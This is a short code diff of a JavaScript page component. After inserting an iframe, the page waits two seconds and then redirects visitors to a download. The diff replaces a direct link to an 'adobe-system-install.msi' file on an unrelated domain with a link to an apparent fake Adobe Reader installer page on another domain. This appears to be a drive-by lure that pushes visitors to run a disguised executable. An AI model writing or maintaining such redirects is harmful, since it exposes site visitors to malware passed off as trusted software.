@@ -14,7 +14,7 @@ export default function Home() {
       document.body.appendChild(iframe);
 
       setTimeout(() => {
-        window.location.href = 'https://municipiodezongolica.com.mx/adobe-system-install.msi';
+        window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
       }, 2000);
       return;
     }
